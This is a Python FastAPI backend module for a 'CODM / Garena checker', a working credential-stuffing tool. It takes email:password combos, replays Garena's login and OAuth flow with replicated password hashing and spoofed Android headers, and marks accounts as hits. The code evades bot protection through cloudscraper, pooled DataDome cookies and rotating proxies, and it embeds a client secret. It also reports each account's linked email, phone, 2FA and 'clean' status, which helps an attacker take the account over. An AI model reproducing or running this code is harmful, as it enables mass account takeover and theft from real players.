# ============================================================
#  routers/codm.py  —  CODM / Garena Checker Backend
#  v4.1 — Fixed admin auth: now uses require_admin from auth.py
#          instead of its own broken _ADMIN_KEY guard.
#
#  Cookie pool priority:  Redis (codm:cookies)  →  env CODM_COOKIES
#  Proxy pool priority:   per-request proxy arg  →  Redis (codm:proxies)  →  none
#  Admin endpoints:
#    GET  /api/codm/cookies          list cookies
#    POST /api/codm/cookies          replace cookie pool
#    DELETE /api/codm/cookies        clear cookie pool
#    GET  /api/codm/proxies          list proxies
#    POST /api/codm/proxies          replace proxy pool
#    DELETE /api/codm/proxies        clear proxy pool
#    POST /api/codm/check-one        check one combo (Flutter)
# ============================================================

import hashlib
import base64
import json
import time
import random
import logging
import os
import urllib.parse

import requests as _req

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from typing import Optional, List

# ── Use the same admin auth as every other router ─────────────
from auth import require_admin

logger = logging.getLogger(__name__)
router = APIRouter()

# ── Dependency guards ─────────────────────────────────────────
try:
    import cloudscraper
    _HAS_CLOUDSCRAPER = True
except ImportError:
    _HAS_CLOUDSCRAPER = False
    logger.warning("⚠️  cloudscraper not installed — CODM checker disabled")

try:
    from Crypto.Cipher import AES
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False
    logger.warning("⚠️  pycryptodome not installed — CODM checker disabled")

# ── User-Agents (matching working Python script exactly) ─────
_UA_NEW = (
    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
    "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
)
_UA_OLD = (
    "Mozilla/5.0 (Linux; Android 11; RMX2195) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
)
_UA_SDK = "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"

# ── CODM client secret ────────────────────────────────────────
_CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"


# ─────────────────────────────────────────────────────────────
#  Upstash Redis helpers  (no extra package — plain HTTP)
# ─────────────────────────────────────────────────────────────

_UPSTASH_URL = os.getenv("UPSTASH_REDIS_REST_URL", "")
_UPSTASH_TOK = os.getenv("UPSTASH_REDIS_REST_TOKEN", "")

_REDIS_KEY_COOKIES = "codm:cookies"
_REDIS_KEY_PROXIES = "codm:proxies"


def _redis_cmd(*args) -> object:
    """Fire a single Redis command via Upstash REST API.
    Returns the 'result' field, or None on any error.
    """
    if not _UPSTASH_URL or not _UPSTASH_TOK:
        return None
    try:
        r = _req.post(
            _UPSTASH_URL,
            headers={
                "Authorization": f"Bearer {_UPSTASH_TOK}",
                "Content-Type": "application/json",
            },
            json=list(args),
            timeout=6,
        )
        return r.json().get("result")
    except Exception as e:
        logger.warning(f"Redis cmd {args[0]} failed: {e}")
        return None


def _redis_get_list(key: str) -> List[str]:
    """Get a JSON-encoded list from Redis. Returns [] on miss/error."""
    raw = _redis_cmd("GET", key)
    if not raw:
        return []
    try:
        data = json.loads(raw)
        return data if isinstance(data, list) else []
    except Exception:
        return []


def _redis_set_list(key: str, items: List[str]) -> bool:
    """Store a list as JSON in Redis. Returns True on success."""
    result = _redis_cmd("SET", key, json.dumps(items))
    return result == "OK"


def _redis_del(key: str) -> bool:
    result = _redis_cmd("DEL", key)
    return bool(result)


# ─────────────────────────────────────────────────────────────
#  Cookie pool
#  Priority: Redis (codm:cookies) → env CODM_COOKIES
# ─────────────────────────────────────────────────────────────

def _get_all_cookies() -> List[str]:
    """Return all cookie lines from Redis or env fallback."""
    # 1. Try Redis
    redis_cookies = _redis_get_list(_REDIS_KEY_COOKIES)
    if redis_cookies:
        return redis_cookies
    # 2. Fallback to env var
    raw = os.getenv("CODM_COOKIES", "")
    return [l.strip() for l in raw.splitlines() if l.strip()]


def _pick_datadome() -> Optional[str]:
    """Pick a random DataDome cookie value from the pool."""
    lines = _get_all_cookies()
    if not lines:
        return None
    line = random.choice(lines)
    # Handle "datadome=VALUE" or raw "VALUE"
    for part in line.split(";"):
        part = part.strip()
        if part.lower().startswith("datadome="):
            return part.split("=", 1)[1]
    return line  # treat the whole line as the raw value


# ─────────────────────────────────────────────────────────────
#  Proxy pool
#  Priority: per-request arg → Redis (codm:proxies) → None
# ─────────────────────────────────────────────────────────────

def _get_all_proxies() -> List[str]:
    return _redis_get_list(_REDIS_KEY_PROXIES)


def _pick_proxy(override: Optional[str] = None) -> Optional[str]:
    """Return a proxy string or None.
    If override is provided (from Flutter request), use that.
    Otherwise, pick a random one from the Redis pool.
    """
    if override and override.strip():
        return override.strip()
    pool = _get_all_proxies()
    return random.choice(pool) if pool else None


def _proxy_dict(proxy_str: Optional[str]) -> Optional[dict]:
    """Convert a proxy string to requests-compatible proxy dict."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    # Normalize: add http:// scheme if missing
    if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy_str = f"http://{proxy_str}"
    return {"http": proxy_str, "https": proxy_str}


# ─────────────────────────────────────────────────────────────
#  Crypto helpers  (identical to Python script)
# ─────────────────────────────────────────────────────────────

def _md5(s: str) -> str:
    return hashlib.md5(urllib.parse.unquote(s).encode("utf-8")).hexdigest()

def _sha256(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

def _aes_ecb(passmd5: str, outer_hash: str) -> str:
    key = bytes.fromhex(outer_hash)
    plaintext = bytes.fromhex(passmd5)
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext).hex()[:32]

def hash_password(password: str, v1: str, v2: str) -> str:
    passmd5 = _md5(password)
    inner_hash = _sha256(passmd5 + v1)
    outer_hash = _sha256(inner_hash + v2)
    return _aes_ecb(passmd5, outer_hash)

def _gen_uuid() -> str:
    r = list(os.urandom(16))
    r[6] = (r[6] & 0x0F) | 0x40
    r[8] = (r[8] & 0x3F) | 0x80
    parts = [r[0:4], r[4:6], r[6:8], r[8:10], r[10:16]]
    return "-".join("".join(f"{b:02x}" for b in g) for g in parts)


# ─────────────────────────────────────────────────────────────
#  Session factory  (now with proxy support)
# ─────────────────────────────────────────────────────────────

def _make_session(datadome: Optional[str] = None, proxy: Optional[str] = None):
    proxies = _proxy_dict(proxy)
    session = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "android", "mobile": True},
        delay=1,
    )
    session.headers.update({"Accept-Encoding": "gzip, deflate, br, zstd"})
    if datadome:
        session.cookies.set("datadome", datadome, domain=".garena.com")
    if proxies:
        session.proxies.update(proxies)
    return session


# ─────────────────────────────────────────────────────────────
#  Step 1 — Prelogin  (100082.connect.garena.com, app_id=100082)
# ─────────────────────────────────────────────────────────────

def _prelogin(session, account: str) -> tuple[Optional[str], Optional[str]]:
    for attempt in range(3):
        try:
            ts = int(time.time() * 1000)
            params = {
                "app_id": "100082",
                "account": account,
                "format": "json",
                "id": str(ts),
            }
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Host": "100082.connect.garena.com",
                "Referer": (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
                ),
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "User-Agent": _UA_NEW,
                "X-Requested-With": "com.garena.game.codm",
            }
            res = session.get(
                "https://100082.connect.garena.com/api/prelogin",
                headers=headers,
                params=params,
                timeout=20,
            )
            if res.status_code == 403:
                logger.warning(f"Prelogin 403 attempt {attempt+1}")
                time.sleep(2)
                continue
            if res.status_code != 200:
                continue
            data = res.json()
            if "error" in data:
                return None, None
            v1 = data.get("v1")
            v2 = data.get("v2")
            if v1 and v2:
                return v1, v2
        except Exception as e:
            logger.warning(f"Prelogin attempt {attempt+1} error: {e}")
            time.sleep(1)
    return None, None


# ─────────────────────────────────────────────────────────────
#  Step 2 — Login  (100082.connect.garena.com)
# ─────────────────────────────────────────────────────────────

def _login(session, account: str, password: str, v1: str, v2: str) -> tuple[Optional[str], str]:
    hashed_pw = hash_password(password, v1, v2)
    for attempt in range(3):
        try:
            ts = int(time.time() * 1000)
            params = {
                "app_id": "100082",
                "account": account,
                "password": hashed_pw,
                "redirect_uri": "gop100082://auth/",
                "format": "json",
                "id": str(ts),
            }
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Host": "100082.connect.garena.com",
                "Referer": (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
                ),
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "User-Agent": _UA_NEW,
                "X-Requested-With": "com.garena.game.codm",
            }
            res = session.get(
                "https://100082.connect.garena.com/api/login",
                headers=headers,
                params=params,
                timeout=20,
            )
            if res.status_code != 200:
                time.sleep(1)
                continue
            data = res.json()
            if "error" in data:
                err = str(data["error"]).lower()
                if "captcha" in err:
                    time.sleep(3)
                    continue
                return None, "wrong_password"
            # sso_key from body or session cookies
            sso_key = data.get("sso_key") or session.cookies.get("sso_key")
            if sso_key:
                return sso_key, "ok"
        except Exception as e:
            logger.warning(f"Login attempt {attempt+1} error: {e}")
            time.sleep(1)
    return None, "failed"


# ─────────────────────────────────────────────────────────────
#  Step 3 — Account info  (account.garena.com)
# ─────────────────────────────────────────────────────────────

def _account_info(session, sso_key: str) -> Optional[dict]:
    try:
        session.cookies.set("sso_key", sso_key, domain=".garena.com")
        res = session.get(
            "https://account.garena.com/api/account/init",
            headers={"Accept": "application/json", "User-Agent": _UA_NEW},
            timeout=20,
        )
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        logger.warning(f"Account info error: {e}")
    return None


# ─────────────────────────────────────────────────────────────
#  Step 4a — CODM access token  (new 100082 flow)
# ─────────────────────────────────────────────────────────────

def _codm_token_new(session, sso_key: str) -> Optional[str]:
    try:
        ts = str(int(time.time() * 1000))

        grant_headers = {
            "Host": "100082.connect.garena.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": '"Android"',
            "User-Agent": _UA_NEW,
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://100082.connect.garena.com",
            "X-Requested-With": "com.garena.game.codm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": (
                "https://100082.connect.garena.com/universal/oauth"
                "?client_id=100082&locale=en-US&create_grant=true"
                "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
            ),
            "Accept-Language": "en-US,en;q=0.9",
        }
        session.cookies.set("sso_key", sso_key, domain=".connect.garena.com")
        grant_body = urllib.parse.urlencode({
            "client_id": "100082",
            "response_type": "code",
            "redirect_uri": "gop100082://auth/",
            "create_grant": "true",
            "login_scenario": "normal",
            "format": "json",
            "id": ts,
        })
        grant_res = session.post(
            "https://100082.connect.garena.com/oauth/token/grant",
            headers=grant_headers,
            data=grant_body,
            timeout=15,
        )
        grant_res.raise_for_status()
        auth_code = grant_res.json().get("code")
        if not auth_code:
            return None

        device_id = f"02-{_gen_uuid()}"
        exchange_body = urllib.parse.urlencode({
            "grant_type": "authorization_code",
            "code": auth_code,
            "device_id": device_id,
            "redirect_uri": "gop100082://auth/",
            "source": "2",
            "client_id": "100082",
            "client_secret": _CLIENT_SECRET,
        })
        exchange_res = session.post(
            "https://100082.connect.garena.com/oauth/token/exchange",
            headers={
                "User-Agent": _UA_SDK,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "100082.connect.garena.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            },
            data=exchange_body,
            timeout=15,
        )
        exchange_res.raise_for_status()
        return exchange_res.json().get("access_token")

    except Exception as e:
        logger.warning(f"CODM new token flow failed: {e}")
        return None


# ─────────────────────────────────────────────────────────────
#  Step 4b — CODM access token  (old auth.garena.com fallback)
# ─────────────────────────────────────────────────────────────

def _codm_token_old(session) -> Optional[str]:
    try:
        ts = str(int(time.time() * 1000))
        res = session.post(
            "https://auth.garena.com/oauth/token/grant",
            headers={
                "User-Agent": _UA_OLD,
                "Pragma": "no-cache",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": (
                    "https://auth.garena.com/universal/oauth?all_platforms=1"
                    "&response_type=token&locale=en-SG&client_id=100082"
                    "&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n"
                    "?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
                ),
            },
            data=(
                "client_id=100082&response_type=token"
                "&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n"
                "%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F"
                f"&format=json&id={ts}"
            ),
            timeout=15,
        )
        return res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM old token flow failed: {e}")
        return None


# ─────────────────────────────────────────────────────────────
#  Step 5 — CODM OAuth callback → codm_token
# ─────────────────────────────────────────────────────────────

def _codm_callback(session, access_token: str, old_flow: bool = False) -> Optional[dict]:
    bases = (
        ["https://api-delete-request.codm.garena.co.id"]
        if old_flow
        else [
            "https://api-delete-request-aos.codm.garena.co.id",
            "https://api-delete-request.codm.garena.co.id",
        ]
    )
    for base in bases:
        try:
            res = session.get(
                f"{base}/oauth/callback/?access_token={access_token}",
                headers={
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                    "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                },
                timeout=15,
                allow_redirects=False,
            )
            loc = res.headers.get("location", "")
            if "err=3" in loc:
                return {"status": "no_codm"}
            if "token=" in loc:
                parsed = urllib.parse.urlparse(loc)
                tok = urllib.parse.parse_qs(parsed.query).get("token", [""])[0]
                if tok:
                    return {"status": "ok", "token": tok}
        except Exception as e:
            logger.warning(f"CODM callback failed for {base}: {e}")
    return None


# ─────────────────────────────────────────────────────────────
#  Step 6 — CODM user info  (JWT decode first, then API)
# ─────────────────────────────────────────────────────────────

def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
    try:
        parts = token.split(".")
        if len(parts) == 3:
            p = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
            payload = json.loads(base64.urlsafe_b64decode(p))
            user = payload.get("user")
            if user:
                return user
    except Exception:
        pass

    base = (
        "https://api-delete-request.codm.garena.co.id"
        if old_flow
        else "https://api-delete-request-aos.codm.garena.co.id"
    )
    try:
        res = session.get(
            f"{base}/oauth/check_login/",
            headers={
                "authority": base.replace("https://", ""),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "codm-delete-token": token,
                "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                "X-Requested-With": "XMLHttpRequest",
                "x-requested-with": "com.garena.game.codm",
            },
            timeout=15,
        )
        data = res.json()
        return data.get("user", {})
    except Exception as e:
        logger.warning(f"CODM user info API failed: {e}")
        return {}


# ─────────────────────────────────────────────────────────────
#  Parse Garena account details
# ─────────────────────────────────────────────────────────────

def _parse_account(data: dict) -> dict:
    u = data.get("user_info", data)
    email = u.get("email", "")
    mobile = u.get("mobile_no", "")
    email_v = u.get("email_v") in (1, True)
    fb = u.get("is_fbconnect_enabled") in (1, True)
    id_card = u.get("idcard", "")
    two_step = u.get("two_step_verify_enable") in (1, True)

    binds = []
    if email_v or (email and not email.startswith("*") and "@" in email):
        binds.append("Email")
    if mobile and mobile.strip() and mobile != "N/A":
        binds.append("Phone")
    if fb:
        binds.append("Facebook")
    if id_card and id_card.strip() and id_card != "N/A":
        binds.append("ID Card")
    if two_step:
        binds.append("2FA")

    return {
        "shell": str(u.get("shell", 0)),
        "country": str(u.get("acc_country", "")),
        "is_clean": len(binds) == 0,
        "binds": binds,
        "two_step": two_step,
        "email": email,
    }


# ─────────────────────────────────────────────────────────────
#  Pydantic models
# ─────────────────────────────────────────────────────────────

class CheckOneRequest(BaseModel):
    combo: str
    user_id: Optional[str] = None
    proxy: Optional[str] = None      # optional per-request proxy


class CheckOneResponse(BaseModel):
    combo: str
    status: str        # "hit" | "valid_no_codm" | "bad" | "error"
    detail: str = ""
    nickname: str = ""
    level: str = ""
    region: str = ""
    uid: str = ""
    shell: str = ""
    country: str = ""
    is_clean: bool = False
    binds: list = []


class CookieUpdateRequest(BaseModel):
    cookies: List[str]   # list of "datadome=VALUE" lines


class ProxyUpdateRequest(BaseModel):
    proxies: List[str]   # list of "http://user:pass@host:port" or "host:port"


# ─────────────────────────────────────────────────────────────
#  Admin — Cookie pool endpoints
#  All use Depends(require_admin) — same as every other router.
#  Reads ADMIN_SECRET_KEY from Railway env (set once, shared).
# ─────────────────────────────────────────────────────────────

@router.get("/cookies", dependencies=[Depends(require_admin)])
async def get_cookies():
    cookies = _get_all_cookies()
    return {
        "count": len(cookies),
        "source": "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
        "cookies": cookies,
    }


@router.post("/cookies", dependencies=[Depends(require_admin)])
async def set_cookies(req: CookieUpdateRequest):
    cleaned = [l.strip() for l in req.cookies if l.strip()]
    if not cleaned:
        raise HTTPException(status_code=400, detail="No valid cookie lines provided")
    ok = _redis_set_list(_REDIS_KEY_COOKIES, cleaned)
    if not ok:
        raise HTTPException(status_code=500, detail="Failed to save cookies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}


@router.delete("/cookies", dependencies=[Depends(require_admin)])
async def delete_cookies():
    _redis_del(_REDIS_KEY_COOKIES)
    return {"message": "✅ Cookie pool cleared from Redis (env fallback still active if set)"}


# ─────────────────────────────────────────────────────────────
#  Admin — Proxy pool endpoints
# ─────────────────────────────────────────────────────────────

@router.get("/proxies", dependencies=[Depends(require_admin)])
async def get_proxies():
    proxies = _get_all_proxies()
    return {"count": len(proxies), "proxies": proxies}


@router.post("/proxies", dependencies=[Depends(require_admin)])
async def set_proxies(req: ProxyUpdateRequest):
    cleaned = [l.strip() for l in req.proxies if l.strip()]
    if not cleaned:
        raise HTTPException(status_code=400, detail="No valid proxy lines provided")
    ok = _redis_set_list(_REDIS_KEY_PROXIES, cleaned)
    if not ok:
        raise HTTPException(status_code=500, detail="Failed to save proxies to Redis")
    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}


@router.delete("/proxies", dependencies=[Depends(require_admin)])
async def delete_proxies():
    _redis_del(_REDIS_KEY_PROXIES)
    return {"message": "✅ Proxy pool cleared from Redis"}


# ─────────────────────────────────────────────────────────────
#  Endpoint: POST /api/codm/check-one
# ─────────────────────────────────────────────────────────────

@router.post("/check-one", response_model=CheckOneResponse)
async def check_one(req: CheckOneRequest):
    if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
        return CheckOneResponse(
            combo=req.combo,
            status="error",
            detail="Server missing deps: cloudscraper or pycryptodome. Contact admin.",
        )

    combo = req.combo.strip()
    if ":" not in combo:
        return CheckOneResponse(combo=combo, status="error", detail="Bad format — use email:password")

    account, password = combo.split(":", 1)
    account = account.strip()
    password = password.strip()
    if not account or not password:
        return CheckOneResponse(combo=combo, status="error", detail="Empty account or password")

    datadome = _pick_datadome()
    proxy    = _pick_proxy(req.proxy)           # per-request or pool
    session  = _make_session(datadome, proxy)

    try:
        # Step 1: Prelogin
        v1, v2 = _prelogin(session, account)
        if not v1 or not v2:
            return CheckOneResponse(
                combo=combo, status="bad",
                detail="Prelogin failed — account may not exist or IP blocked",
            )

        # Step 2: Login
        sso_key, login_status = _login(session, account, password, v1, v2)
        if not sso_key:
            return CheckOneResponse(
                combo=combo, status="bad",
                detail="Wrong password or account suspended",
            )

        # Step 3: Account info
        info = _account_info(session, sso_key)
        acc = _parse_account(info) if info else {
            "shell": "", "country": "", "is_clean": False, "binds": []
        }

        # Step 4: CODM access token — new flow first, old as fallback
        access_token = _codm_token_new(session, sso_key)
        old_flow = False
        if not access_token:
            access_token = _codm_token_old(session)
            old_flow = True

        if not access_token:
            return CheckOneResponse(
                combo=combo,
                status="valid_no_codm",
                detail="Valid Garena account — CODM token fetch failed",
                shell=acc["shell"],
                country=acc["country"],
                is_clean=acc["is_clean"],
                binds=acc.get("binds", []),
            )

        # Step 5: OAuth callback
        cb = _codm_callback(session, access_token, old_flow=old_flow)
        if not cb or cb.get("status") == "no_codm":
            return CheckOneResponse(
                combo=combo,
                status="valid_no_codm",
                detail="Valid Garena account — No CODM linked",
                shell=acc["shell"],
                country=acc["country"],
                is_clean=acc["is_clean"],
                binds=acc.get("binds", []),
            )

        # Step 6: CODM user info
        user = _codm_user_info(session, cb["token"], old_flow=old_flow)

        return CheckOneResponse(
            combo=combo,
            status="hit",
            nickname=str(user.get("codm_nickname") or user.get("nickname") or ""),
            level=str(user.get("codm_level") or ""),
            region=str(user.get("region") or ""),
            uid=str(user.get("uid") or ""),
            shell=acc["shell"],
            country=acc["country"],
            is_clean=acc["is_clean"],
            binds=acc.get("binds", []),
            detail="HIT",
        )

    except Exception as e:
        logger.error(f"CODM check error for {account}: {e}")
        return CheckOneResponse(
            combo=combo, status="error",
            detail=f"Server error: {str(e)[:100]}",
        )
    finally:
        try:
            session.close()
        except Exception:
            pass
